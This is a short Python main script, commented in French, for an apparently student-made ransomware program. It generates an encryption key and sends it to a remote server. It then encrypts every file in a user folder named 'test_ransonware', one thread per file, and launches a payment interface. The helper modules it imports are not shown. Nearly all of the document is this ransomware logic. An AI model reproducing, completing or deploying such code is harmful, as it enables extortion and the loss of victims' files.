# Import :
import os, threading
from cryptography.fernet import Fernet
import Crypto_files, Client, Gui

# Variables
chemin = os.path.expanduser("~") + "\\Music\\test_ransonware\\"
# Génération de la clé
clé = Fernet.generate_key()

# Variable à retirer plus tard (débugging)
i = 1
main_thread = threading.currentThread()

# Envoie de la clé sur le serveur distant
Client.sendKey(clé)

# retourne une liste des fichiers non chiffrés et de leurs chemins
liste_des_fichiers_non_chiffrés = Crypto_files.listFiles(chemin)

# Loop à travers ces fichiers
for fichier_non_chiffré in liste_des_fichiers_non_chiffrés:
    # Crée un thread par fichier pour accélérer le processus de chiffrement
    Thread = Crypto_files.generateThread(i, clé, fichier_non_chiffré)
    print(threading.enumerate())
    # Appele la méthode "run()" de la classe "generateThread()"
    Thread.start()
    i += 1

# On s'assure que tous les thread sont terminés
for t in threading.enumerate():
    if t is not main_thread:
        t.join()

# Lancemement de l'interface graphique
Gui.paymentFunction(chemin)
